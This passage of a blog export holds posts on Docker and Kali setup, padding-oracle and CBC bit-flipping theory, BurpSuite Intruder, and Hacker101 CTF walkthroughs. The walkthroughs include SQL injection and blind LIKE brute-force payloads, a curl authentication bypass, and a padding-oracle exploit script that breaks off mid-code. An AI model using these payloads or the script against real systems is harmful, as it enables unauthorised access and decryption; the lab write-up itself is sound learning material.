class-name">.</span></code></pre><figure><img src="https://s2.loli.net/2023/05/15/3Ho7zAJShXPbFiy.png"alt="image-20230515121707909" /><figcaption aria-hidden="true">image-20230515121707909</figcaption></figure></li></ol></li></ul><h3 id="start-an-app-container">Start an app container</h3><ul><li><p>运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-dp</span> <span class="token number">3000</span>:3000 getting-started</code></pre><p><code>docker run -dp 3000:3000 getting-started</code>，用于在容器中运行指定的 Docker 镜像。其中，<code>-d</code>参数表示以“分离模式”运行容器，也就是将容器作为后台进程运行；<code>-p</code>参数用于将容器内部的端口映射到主机上的端口，这里是将容器的 3000端口映射到主机的 3000 端口上；<code>getting-started</code> 则是指定的Docker 镜像名称。</p></li><li><p>浏览器打开<code>localhost:3000</code><imgsrc="https://s2.loli.net/2023/05/15/7BZqK6Wadwkx1GR.png"alt="image-20230515121801318" /><imgsrc="https://s2.loli.net/2023/05/15/Z6FIl1fR7ewKiPa.png"alt="image-20230515121921138" /></p></li></ul><h3 id="安装kali">安装Kali</h3><ol type="1"><li><p>拉取镜像</p></li><li><p><code>ifconfig</code> 需要安装 <code>net-tools</code></p></li><li><p>安装<strong>全家桶</strong>报错：<code>Unable to locate package</code>:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#启动 并交互</span><span class="token function">docker</span> run <span class="token parameter variable">--tty</span> <span class="token parameter variable">--interactive</span> kalilinux/kali-rolling<span class="token comment">#更换源</span>deb http://http.kali.org/kali kali-rolling main non-free contribdeb http://http.kali.org/kali kali-last-snapshot main non-free contribdeb http://http.kali.org/kali kali-experimental main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib<span class="token comment">#安装全家桶</span><span class="token comment">#时间真的久</span><span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> kali-linux-everything</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto Crash Course</title>
      <link href="/2023/12/09/crypto-crash-course/"/>
      <url>/2023/12/09/crypto-crash-course/</url>
      
        <content type="html"><![CDATA[<h3 id="padding-oracle-原理深度解析-cbc-字节翻转攻击原理解析">paddingoracle 原理深度解析 &amp; CBC 字节翻转攻击原理解析</h3><ol type="1"><li><p>Padding的含义是“填充”，在解密时，如果算法发现解密后得到的结果，它的填充方式不符合规则，那么表示输入数据有问题，对于解密的类库来说，往往便会抛出一个<strong>异常</strong>，提示Padding不正确。Oracle在这里便是“提示”的意思</p></li><li><p>padding oracle漏洞的就是CBC加密模式</p></li><li><p>AES是对称加密，对称加密呢有两大类加密模式，即<strong>分组加密</strong>和<strong>流加密</strong>，AES分组加密有五种加密模式:</p><ol type="1"><li>电码本模式（Electronic Codebook Book (ECB)）；</li><li>密码分组链接模式（Cipher Block Chaining (CBC)）；</li><li>计算器模式（Counter (CTR)）；</li><li>密码反馈模式（Cipher FeedBack (CFB)）；</li><li>输出反馈模式（Output FeedBack (OFB)）</li></ol></li><li><p>AES是加密算法，<strong>加密算法</strong>是通过接收方和发送方协商产生密钥，结合一系列的各种位运算之后得出的结果。而<strong>加密模式</strong>是在加密算法的基础上，把加密的方式变得更加复杂一点</p></li><li><p>CBC模式是一个链式结构<imgsrc="https://s2.loli.net/2023/07/26/7wOnDS9oQqWvE6G.jpg"alt="640" /></p><ol type="1"><li>在通过AES加密之前我们需要先将明文块0，也就是第一块明文，和我们的初始向量IV做异或操作，这个初始向量IV是随机的，而且长度是和我们的每一块明文块等长，因为要按位进行异或。这样无疑就在加密之前就已经先行打乱的我们的明文，与初始化向量异或后的明文，我们暂且称它为中间值，我们此时再对这个中间值进行AES加密，这样第一块明文的加密就完成了。</li><li>我们将第一块明文加密后的密文，作为第二个明文加密时的初始化向量，而这个就是这个链式结构的连接点，后续的步骤就是不断重复加密第一块明文时所做的操作，直至最后一块明文加密完成</li></ol><p>但是CBC这个模式在设计上存在缺陷，而这个<strong>缺陷</strong>就导致了著名的padding oracle攻击</p></li><li><p>用AES和DES两个加密算法来举例子AES的分组长度为每块16字节，DES呢则是每块8字节，那么怎么能保证我们的明文长度是<strong>16或者8的整数倍</strong>呢？</p><p>当然没办法保证，所以我们就要采取措施强制让明文为16或者8的整数倍，最直接的方法自然就是直接<strong>填充</strong>，不够就补到它够为止。这也就是所谓的padding填充。</p></li><li><p>剩余的几位当然不能随便填充，而要填充一些有价值的数值。</p></li><li><p>假如说此时我们按8字节为一个明文分组，分到最后发现最后一组缺了一个字节，程序不会填一些随机数，亦或者将不够的位数全填零。CBC模式最后的填充方法，就是缺了一位就填一个0x01,缺了两位就填两个0x02,缺了三位就填三个0x03,以此往后类推<strong>缺n个就填n个0x0n</strong>。哪怕当明文正好时分组的整数倍时，也会填充8个0x08，<strong>即使是整数倍也要填充</strong>。这样就导致了无论我们明文的长度是多少，我们CBC模式加密是都会在明文的最后进行填充，以确保分段的长度是8的整数倍。<imgsrc="https://s2.loli.net/2023/07/26/Y1GWSlLJVAytCTB.jpg"alt="640 (1)" /></p></li><li><p>而paddingoracle攻击，同样是通过<strong>服务端返回的信息的差异</strong>而产生的</p></li><li><p>刚才的已知条件中，我提到了初始化向量必须已知才能进行攻击，那么这个初始化向量在哪呢？</p><p>一般是在密文的头部</p></li><li><p>初始化向量和密文的分组等长</p></li><li><p>加密流程<imgsrc="https://s2.loli.net/2023/07/26/TVhFmAYfnltqdzv.png"alt="640" /></p></li><li><p>解密流程<imgsrc="https://s2.loli.net/2023/07/26/TVhFmAYfnltqdzv.png"alt="640" /></p></li><li><p>将初始化向量<strong>全部制为零</strong>,异或的结果是3D，此时我们是不可能知道这个异或出来的结果是3D的，但是此时服务端会报一个错，那就是填充位错误，为什么会报这个错，因为之前说了，填充文在8个字节为分组的情况下，最多只可能填到8个0x08，所以怎么可能会有0x3D呢？<imgsrc="https://s2.loli.net/2023/07/26/l7AyDSZnQrGubkm.png"alt="bea01e04-f419-4b48-927e-64a7e17d2502" /></p></li><li><p>如果此时异或出来的结果为“39732322076a2601”也就是异或出来的结果最后一位为<strong>0x01</strong>时就不会报填充位错误了。但是后续还会在爆一个错误，那就是业务判断你这个解密出来的明文数据也就是“39732322076a2601”不正确，因为我们初始化向量都制为零的，所以这个明文当然是错误的，<em>不过这都不重要</em>。<imgsrc="https://s2.loli.net/2023/07/26/1iKc5YqMw7BjnZp.png"alt="872ae514-4c57-46e6-828b-363d8da39896" /></p></li><li><p>我们就需要变化初始化向量的最后一个字节让其和中间值的最后一个字节异或的结果为0x01,所以此时我们需要用到穷举的方法，一个字节的范围为，<strong>0x00-0xFF</strong>,最多也就是需要尝试256次，</p></li><li><p><code>“q” xor “a” xor “q” == “a”</code></p></li><li><p>CBC字节翻转攻击</p><ol type="1"><li><code>X = “q” xor “a”</code></li><li><code>Y = “q” xor "a" xor " b"</code></li><li><code>Y xor q xor a = b</code></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My Color</title>
      <link href="/2023/12/09/color/"/>
      <url>/2023/12/09/color/</url>
      
        <content type="html"><![CDATA[<h3 id="as-the-following">as the following</h3><ol type="1"><li>name:<ol type="1"><li>#282a36</li><li>#44475a</li><li>#f8f8f2</li><li>#6272a4<br /></li><li>#8be9fd<br /></li><li>#50fa7b<br /></li><li>#11ff93<br /></li><li>#ffb86c<br /></li><li>#ff79c6<br /></li><li>#bd93f9<br /></li><li>#ff5555<br /></li><li>#f1fa8c</li></ol></li><li>color collections<imgsrc="https://s2.loli.net/2023/11/30/Bo5jMXcURnt4bzT.png"alt="image-20231130022505973" /></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Beautify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite</title>
      <link href="/2023/12/09/burpsuite/"/>
      <url>/2023/12/09/burpsuite/</url>
      
        <content type="html"><![CDATA[<h3 id="intruder">Intruder</h3><ul><li><p>A <strong>Sniper</strong> attack inserts a single set ofpayloads, one by one, into one or more positions within therequest.</p></li><li><p><strong>Battering ram</strong> This attack places the samepayload into all of the defined payload positions simultaneously. Ituses a single payload set.</p></li><li><p><strong>Pitchfork</strong></p><p>This attack iterates through a different payload set for each definedposition. Payloads are placed into each position simultaneously. Forexample, the first three requests would be:</p><ul><li>Request one:<ul><li>Position 1 = First payload from Set 1.</li><li>Position 2 = First payload from Set 2.</li></ul></li><li>Request two:<ul><li>Position 1 = Second payload from Set 1.</li><li>Position 2 = Second payload from Set 2.</li></ul></li></ul></li><li><p><strong>Cluster bomb</strong></p><p>This attack iterates through a different payload set for each definedposition. Payloads are placed from each set in turn, so that all payloadcombinations are tested. For example, the first three requests wouldbe:</p><ul><li>Request one:<ul><li>Position 1 = First payload from Set 1.</li><li>Position 2 = First payload from Set 2.</li></ul></li><li>Request two:<ul><li>Position 1 = First payload from Set 1.</li><li>Position 2 = Second payload from Set 2</li></ul></li></ul></li></ul><h3 id="证书安装">证书安装</h3><ol type="1"><li>点击<code>import</code>找不到证书<imgsrc="https://s2.loli.net/2023/08/08/FLSCknriybjMVtG.png"alt="image-20230808000601521" /></li></ol><h3 id="burp扩展">burp扩展</h3><ol type="1"><li>更新版本才能安装<imgsrc="https://s2.loli.net/2023/08/13/pZyheKBsjVFicU5.png" /></li><li>换个方法：github安装<ol type="1"><li><code>release</code> 下载<code>.jar</code>文件</li><li>安装<img src="https://s2.loli.net/2023/08/13/sW3H4PEhC9pXoYw.png"alt="image-20230813094556395" /></li></ol></li></ol><h3 id="create-a-new-project">Create a new project]</h3><ol type="1"><li>give a file name: like below<imgsrc="https://s2.loli.net/2023/09/07/vl4pcqm6gY7wRiU.png"alt="image-20230907015944798" /></li></ol><h3 id="set-the-target-scope">Set the target scope</h3><ol type="1"><li>the target scope tells Burp exactly which URLs and hosts you<strong>want to test</strong>.</li></ol><hr /><ol type="1"><li>add to scope<imgsrc="https://s2.loli.net/2023/09/07/pUNgRvcWoIMx7JT.png"alt="image-20230907032730937" /></li><li>filter<img src="https://s2.loli.net/2023/09/07/sTnOyxGDLqKvhmC.png"alt="image-20230907032752390" /></li></ol><h3 id="run-your-first-scan">Run your first scan</h3><ol type="1"><li><p>第一阶段是<code>爬行</code>,获取网站的内容结构和功能信息,建立网站地图。</p><p>第二阶段是<code>审计</code>,分析网站行为,检查是否存在漏洞或其他问题。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Browser Extension&amp;Script</title>
      <link href="/2023/12/09/browser-extension-script/"/>
      <url>/2023/12/09/browser-extension-script/</url>
      
        <content type="html"><![CDATA[<h3 id="session-buddy">Session buddy</h3>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Extension &amp; Script </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>101CTF</title>
      <link href="/2023/12/09/101-ctf/"/>
      <url>/2023/12/09/101-ctf/</url>
      
        <content type="html"><![CDATA[<h3 id="a-little-something-to-get-you-started">A little something to getyou started</h3><ol type="1"><li><p>F12</p></li><li><p>background.png 感觉不对劲</p></li><li><p>直接请求url</p><pre class="language-python" data-language="python"><code class="language-python">https<span class="token punctuation">:</span><span class="token operator">//</span>5f678d077edd75ad08f8ecb0f0a70441<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>hacker101<span class="token punctuation">.</span>com<span class="token operator">/</span>background<span class="token punctuation">.</span>png</code></pre></li></ol><h3 id="micro-cms-v1">Micro-CMS v1</h3><ul><li>4个flag</li></ul><ol type="1"><li><strong>flag1</strong>:sql注入<imgsrc="https://s2.loli.net/2023/07/12/gFwBmcNHl5toYR8.png"alt="image-20230712045247680" /></li><li><strong>flag2&amp;3:</strong>标题框xss和编辑内容框xss<imgsrc="https://s2.loli.net/2023/07/12/RvDYb9fNcSj5gzM.png"alt="image-20230712045543950" /><ul><li>生成页面后，返回主界面</li><li>第2个xss(过滤 <code>&lt;script&gt;</code>),查询<strong>Cross-sitescripting (XSS) cheat sheet</strong>，换其他payload,然后F12</li></ul></li><li><strong>flag4</strong>:生成页面的起始数字是9,3-8到都没有，于是<imgsrc="https://s2.loli.net/2023/07/12/kQ86IR79SLolUuf.png"alt="image-20230712051103378" /></li></ol><h3 id="micro-cms-v2">Micro-CMS v2</h3><p><a href="https://paper.seebug.org/1123/#5padding-oracle">参考</a></p><ol type="1"><li><p><strong>flag1:sql注入</strong></p><ol type="1"><li><p>https://d3fd7b52cf00f7950d484620229a16c0.ctf.hacker101.com/login</p><p>payload:</p><pre class="language-none"><code class="language-none">username&#x3D;admin&#39; union select &#39;123&#39; as password -- &amp;password&#x3D;123</code></pre><figure><img src="https://s2.loli.net/2023/07/24/6p5orOGPIjk24eC.png"alt="image-20230724010333677" /><figcaption aria-hidden="true">image-20230724010333677</figcaption></figure><p>分析：密码字段还是会被检查</p></li><li><p>Go home，打开新生成的页面</p></li></ol></li><li><p><strong>flag2</strong>编辑页面需要管理员权限,</p><ol type="1"><li><p>在post请求中，删掉Cookie<imgsrc="https://s2.loli.net/2023/07/25/yHQhpT7lnV8CavU.png"alt="image-20230725144445029" /></p></li><li><p>法二,curl请求绕过</p><pre class="language-http" data-language="http"><code class="language-http">curl -v -X POST https://74f0ada65832887e23462b76f9db27be.ctf.hacker101.com/page/edit/2  </code></pre><p>解析：</p><p>应用程序可能对某些请求或特定的URL路径执行不同的身份验证检查，使得Curl请求绕过了要求身份验证的路径。</p><p>Curl是一个命令行工具和库，用于发送和接收HTTP、HTTPS、FTP、FTPS等协议的数据。它支持多种操作系统，包括Linux、macOS、Windows等，是一个功能强大且广泛使用的网络工具。</p><p>Curl的基本用法是通过命令行发送HTTP请求，并接收服务器的响应。它的基本语法如下：</p><pre class="language-none"><code class="language-none">curl [options] [URL]</code></pre><p>其中，<code>options</code>是curl的各种选项，用于控制请求的行为和配置。<code>URL</code>是要发送请求的目标网址。</p><p>Curl支持许多不同的选项，可以设置请求的方法（GET、POST、PUT等）、请求头、请求体、身份验证、代理等信息。它还可以输出响应数据、保存响应到文件、设置超时等。</p><p>例如，发送GET请求可以使用以下命令：</p><pre class="language-none"><code class="language-none">curl https:&#x2F;&#x2F;example.com</code></pre><p>发送POST请求并携带请求数据可以使用以下命令：</p><pre class="language-none"><code class="language-none">curl -X POST -d &quot;key1&#x3D;value1&amp;key2&#x3D;value2&quot; https:&#x2F;&#x2F;example.com</code></pre><p>Curl的灵活性和功能丰富使得它成为很多开发人员、系统管理员和安全研究人员喜爱的网络工具。它可以用于调试和测试API、下载文件、上传数据、进行网络性能测试等各种用途。</p></li></ol></li><li><p>flag3:登录界面绕过用户名，爆破出密码，sqlmap用不了</p><ol type="1"><li><p>捕捉到响应的不同<imgsrc="https://s2.loli.net/2023/07/26/qKcXURAwgohn4am.png"alt="image-20230726134351055" /></p><figure><img src="https://s2.loli.net/2023/07/26/qmKM78ftPu3LVSR.png"alt="image-20230726134415765" /><figcaption aria-hidden="true">image-20230726134415765</figcaption></figure></li><li><p>密码长度<imgsrc="https://s2.loli.net/2023/07/26/F5Nwb2DIlBEpSWd.png"alt="image-20230726135323197" /></p></li><li><p>payload:逐个字母爆破</p><pre class="language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token string">' or password like '</span>dorind§x§<span class="token operator">%</span>' <span class="token comment">#  &amp;password=yy</span></code></pre><p>LIKE操作符进行模糊查询：</p><p><code>password like 'a%'</code>: 这部分表示一个SQLLIKE操作符，用于对<code>password</code>字段进行模糊查询。<code>like</code>操作符用于匹配指定模式的字符串，<code>%</code>表示匹配任意字符（零个或多个字符）。</p></li><li><p>正确密码发送请求<imgsrc="https://s2.loli.net/2023/07/26/GMn82ELlfJzKhHj.png"alt="image-20230726135521947" /></p></li></ol></li></ol><h3 id="encrypted-pastebin">Encrypted Pastebin</h3><ol type="1"><li><strong>flag1:</strong>首先观察下，看起来像base64编码，但是后面一般默认==结尾，发篇文章替换post参数<imgsrc="https://s2.loli.net/2023/07/26/GLHMV3ugzwInE98.png"alt="image-20230726232023232" /></li><li><strong>flag2</strong></li></ol><ul><li>原理：</li></ul><h4 id="一个超强脚本4个flag">一个超强脚本：4个flag</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Example:</span><span class="token comment"># python3 main.py 'http://35.190.155.168/a4f0863709/?post=C1R8KPdiqzFlAl-F!oI-Uusszt6iMYZYpp4kgEuzXJ30LE8wLHwo5V8Hhxzn8d6Q-GwtaJXuTVMo0xxwWPYDSjCRhCbNPY915y-vLmkXNtPnbpDnzp0o!qAJKVQmWTxXRqjWG1I3KZ6WrPktcGm920WZjk!1R0eRIhIWHqpNB4mqs5CZtCPPKZm-w2QAwmbnfdLiDj33Su2nEVYgtofaBw~~'</span><span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">import</span> binascii<span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">import</span> copy<span class="token keyword">import</span> json<span class="token keyword">from</span> enum <span class="token keyword">import</span> Enum<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token keyword">import</span> logging<span class="token keyword">import</span> queue <span class="token keyword">as</span> queue__fmt__<span class="token operator">=</span><span class="token string">'%(levelname)s %(funcName)s: %(message)s '</span>logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">,</span> <span class="token builtin">format</span><span class="token operator">=</span>__fmt__<span class="token punctuation">)</span>BLOCK_SIZE <span class="token operator">=</span> <span class="token number">16</span>URL_PREFIX <span class="token operator">=</span> <span class="token string">""</span>PRE_CALC_CT_BLOCK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>PRE_CALC_PrePT_BLOCK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>f <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token punctuation">(</span>x <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span>BLOCK_SIZE <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BLOCK_SIZE<span class="token punctuation">)</span> <span class="token operator">*</span> \                <span class="token builtin">chr</span><span class="token punctuation">(</span>BLOCK_SIZE <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BLOCK_SIZE<span class="token punctuation">)</span>unpad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>b64d <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> binascii<span class="token punctuation">.</span>a2b_base64<span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b64e <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_base64<span class="token punctuation">(</span>x<span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'b\''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">)</span>curTime <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>threadLock_get_prePT_for_block_b <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>maxthreads_get_prePT_for_block_b <span class="token operator">=</span> <span class="token number">5</span>sema_get_prePT_for_block_b <span class="token operator">=</span> threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span>value<span class="token operator">=</span>maxthreads_get_prePT_for_block_b<span class="token punctuation">)</span>threadLock_try_k_at_pos <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>maxthreads_try_k_at_pos <span class="token operator">=</span> <span class="token number">24</span>  <span class="token comment"># Best performance in my environment</span>sema_try_k_at_pos <span class="token operator">=</span> threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span>value<span class="token operator">=</span>maxthreads_try_k_at_pos<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">NotFoundError</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token triple-quoted-string string">""" Raised when couldn't find the expected item """</span>   <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">urlToCT</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> b64d<span class="token punctuation">(</span>url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/?post="</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    tmpl <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>tmpl<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># 2 dimentional list</span><span class="token keyword">def</span> <span class="token function">CTToUrl</span><span class="token punctuation">(</span>CT<span class="token punctuation">)</span><span class="token punctuation">:</span>    blocknum <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>CT<span class="token punctuation">)</span>    tmpl <span class="token operator">=</span> <span class="token punctuation">[</span> CT<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> blocknum<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> BLOCK_SIZE<span class="token punctuation">)</span> <span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">)</span>    url <span class="token operator">=</span> URL_PREFIX <span class="token operator">+</span> b64e<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> url<span class="token keyword">class</span> <span class="token class-name">FindkResult</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>    NotFound <span class="token operator">=</span> <span class="token number">0</span>    FoundPotential <span class="token operator">=</span> <span class="token number">1</span>    FoundFlag <span class="token operator">=</span> <span class="token number">2</span><span class="token keyword">def</span> <span class="token function">sendHttpRequest</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>requests<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">)</span><span class="token punctuation">:</span>            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Connection timeout. Retrying"</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"404 Not Found. The url is no longer available. "</span>                <span class="token string">"Please go to hacker101 and reset the page"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        logging<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"Other Error: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">". url = "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Other error occured when sending http request"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Job_try_k_at_pos</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> k<span class="token punctuation">,</span> test_pos<span class="token punctuation">,</span> cooked_IV<span class="token punctuation">,</span> CT_block<span class="token punctuation">,</span> out_queue<span class="token punctuation">,</span> threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>shutdown_flag <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>k <span class="token operator">=</span> k        self<span class="token punctuation">.</span>pos <span class="token operator">=</span> test_pos        self<span class="token punctuation">.</span>cooked_IV <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>cooked_IV<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>CT_block <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>CT_block<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>out_queue <span class="token operator">=</span> out_queue        self<span class="token punctuation">.</span>threads <span class="token operator">=</span> threads     <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        sema_try_k_at_pos<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token 